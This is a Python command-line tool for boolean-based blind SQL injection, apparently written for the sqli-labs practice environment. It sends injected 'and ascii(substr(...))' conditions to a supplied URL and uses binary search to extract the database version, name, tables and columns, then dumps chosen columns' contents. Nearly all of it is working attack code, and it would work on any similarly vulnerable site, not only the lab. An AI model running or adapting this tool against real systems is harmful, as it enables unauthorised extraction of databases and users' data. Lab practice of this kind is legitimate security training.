import requests
import argparse

parser = argparse.ArgumentParser(usage="代码仅用于sqli-labs关卡")


class BoolInjection:
    def __init__(self, url: str) -> None:
        self.url = url
        self.len = 0
        self.ver = ''
        self.name = ''
        self.table_name = ''
        self.columns = []
        self.version()
        self.db_len()
        self.db_name()
        print(f"数据库：{self.name}")
        self.db_table()
        print(f"表名：{self.table_name}")
        self.db_column()

    def version(self):
        for i in range(1, 7):
            for j in range(100):
                payload = f" and mid(version(),{i},1)={j} --+"
                url = self.url + payload
                response = requests.get(url)
                if response.status_code == 200 and b'You are in' in response.content:
                    self.ver += str(j)
                    break
        self.ver = self.ver.replace('0', '.')
        print(f"数据库版本为{self.ver}")

    def db_len(self):
        for i in range(1, 20):
            payload = f" and length(database())={i}; -- "
            url = self.url + payload
            response = requests.get(url)
            if response.status_code == 200 and b'You are in' in response.content:
                self.len = i
                break
        print(f"数据库名长度为{self.len}")

    def db_name(self):
        for i in range(1, self.len + 1):
            left, right = 32, 126
            while left <= right:
                mid = left + ((right - left) >> 1)
                payload = f" and ascii(substring(database(),{i},1))>{mid} -- "
                url = self.url + payload
                response = requests.get(url)
                if response.status_code == 200 and b'You are in' in response.content:
                    left = mid + 1
                    continue
                payload = f" and ascii(substring(database(),{i},1))<{mid} -- "
                url = self.url + payload
                response = requests.get(url)
                if response.status_code == 200 and b'You are in' in response.content:
                    right = mid - 1
                    continue
                payload = f" and ascii(substring(database(),{i},1))={mid} -- "
                url = self.url + payload
                response = requests.get(url)
                if response.status_code == 200 and b'You are in' in response.content:
                    self.name += chr(mid)
                    i += 1
                    continue

    def db_table(self):
        num = 0
        while True:
            payload = self.url + f" and (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())={num} --+ "
            response = requests.get(payload)

            if b'You are in' in response.content:
                break
            else:
                num += 1
        for j in range(num):
            flash = True
            i = 1
            while flash:
                left, right = 32, 126
                while left <= right:
                    mid = left + ((right - left) >> 1)

                    payload = f" and ascii(substr((select table_name from information_schema.tables\
                                where table_schema=database() limit {j},1),{i},1))=0--+"
                    url = self.url + payload
                    response = requests.get(url)
                    if response.status_code == 200 and b'You are in' in response.content:
                        flash = False
                        self.table_name += ','
                        break

                    payload = f" and ascii(substr((select table_name from information_schema.tables\
                                where table_schema=database() limit {j},1),{i},1))>{mid}--+"
                    url = self.url + payload
                    response = requests.get(url)
                    if response.status_code == 200 and b'You are in' in response.content:
                        left = mid + 1
                        continue
                    payload = f" and ascii(substr((select table_name from information_schema.tables\
                            where table_schema=database() limit {j},1),{i},1))<{mid}--+"
                    url = self.url + payload
                    response = requests.get(url)
                    if response.status_code == 200 and b'You are in' in response.content:
                        right = mid - 1
                        continue
                    payload = f" and ascii(substr((select table_name from information_schema.tables\
                            where table_schema=database() limit {j},1),{i},1))={mid}--+"
                    url = self.url + payload
                    response = requests.get(url)
                    if response.status_code == 200 and b'You are in' in response.content:
                        self.table_name += chr(mid)
                        i += 1
                        continue

        table_list = self.table_name.split(',')
        table_list.pop()
        table_dist = {}
        for i in range(len(table_list)):
            table_dist[i] = table_list[i]
        print(f'current-tables: {table_dist}', )
        table_num = int(input('请选择表:'))
        self.table_name = table_dist[table_num]

    def db_column(self):
        """
        and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),%d,1)))=ord('%s')
        :return:
        """
        num = 0
        columnNames = ''
        while True:
            payload = self.url + f" and (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema=DATABASE(" \
                                 f") AND table_name='{self.table_name}')={num} --+"
            response = requests.get(payload)
            if b'You are in' in response.content:
                break
            else:
                num += 1
        for i in range(0, num):
            flag = True
            j = 1
            while flag:
                left, right = 32, 126
                while left <= right:
                    mid = left + ((right - left) >> 1)
                    payload = self.url + f" and ascii(substr((select column_name from information_schema.COLUMNS" \
                                         f" where table_schema=database() and table_name='{self.table_name}' limit {i},1),{j},1))=0 --+"
                    response = requests.get(payload)
                    if response.status_code == 200 and b'You are in' in response.content:
                        flag = False
                        columnNames += ','
                        break

                    payload = self.url + f" and ascii(substr((select column_name from information_schema.COLUMNS" \
                                         f" where table_schema=database() and table_name='{self.table_name}' limit {i},1),{j},1))>{mid} --+"
                    response = requests.get(payload)
                    if response.status_code == 200 and b'You are in' in response.content:
                        left = mid + 1
                        continue

                    payload = self.url + f" and ascii(substr((select column_name from information_schema.COLUMNS" \
                                         f" where table_schema=database() and table_name='{self.table_name}' limit {i},1),{j},1))<{mid} --+"
                    response = requests.get(payload)
                    if response.status_code == 200 and b'You are in' in response.content:
                        right = mid - 1
                        continue

                    payload = self.url + f" and ascii(substr((select column_name from information_schema.COLUMNS" \
                                         f" where table_schema=database() and table_name='{self.table_name}' limit {i},1),{j},1))={mid} --+"
                    response = requests.get(payload)
                    if b'You are in' in response.content:
                        columnNames += chr(mid)
                        j += 1
                        continue
        column_list = columnNames.split(",")
        column_list.pop()
        column_dict = {}

        for i in range(len(column_list)):
            column_dict[i] = column_list[i]
        print(f'current-columns: {column_dict}', )
        columns_num = input('请选择:').split(" ")
        for i in columns_num:
            self.columns.append(column_dict[int(i)])
        self.get_data()

    def get_data(self):
        datacount = 0
        for i in self.columns:
            payload = self.url + f" AND (SELECT COUNT({i}) FROM {self.name}.{self.table_name})={datacount} --+"
            response = requests.get(payload)

            while b'You are in' not in response.content:
                datacount += 1
                payload = self.url + f" AND (SELECT COUNT({i}) FROM {self.name}.{self.table_name})={datacount} --+"
                response = requests.get(payload)

        for s in self.columns:
            data = ''
            for i in range(datacount):
                j = 1
                flag = True
                while flag:
                    left, right = 32, 126
                    while left <= right:
                        mid = left + ((right - left) >> 1)
                        payload = self.url + f" and ORD(MID((SELECT IFNULL(CAST({s} AS CHAR),0x20)FROM {self.name}.{self.table_name} ORDER BY id LIMIT {i},1),{j},1))=0 --+"
                        response = requests.get(payload)
                        if response.status_code == 200 and b'You are in' in response.content:
                            flag = False
                            data += ','
                            break

                        payload = self.url + f" and ORD(MID((SELECT IFNULL(CAST({s} AS CHAR),0x20)FROM {self.name}.{self.table_name} ORDER BY id LIMIT {i},1),{j},1))>{mid} --+"
                        response = requests.get(payload)
                        if response.status_code == 200 and b'You are in' in response.content:
                            left = mid + 1
                            continue

                        payload = self.url + f" and ORD(MID((SELECT IFNULL(CAST({s} AS CHAR),0x20)FROM {self.name}.{self.table_name} ORDER BY id LIMIT {i},1),{j},1))<{mid} --+"
                        response = requests.get(payload)
                        if response.status_code == 200 and b'You are in' in response.content:
                            right = mid - 1
                            continue

                        payload = self.url + f" and ORD(MID((SELECT IFNULL(CAST({s} AS CHAR),0x20)FROM {self.name}.{self.table_name} ORDER BY id LIMIT {i},1),{j},1))={mid} --+"
                        response = requests.get(payload)
                        if b'You are in' in response.content:
                            data += chr(mid)
                            j += 1
                            continue
            data_list = data.split(",")
            data_list.pop()
            data_dict = {}

            for i in range(len(data_list)):
                data_dict[i] = data_list[i]
            print(f'{s}: {data_dict}')


if __name__ == '__main__':
    parser.add_argument('-u', '--url', type=str, metavar='', help='闭合后的URL')
    args = parser.parse_args()
    BoolInjection(args.url)
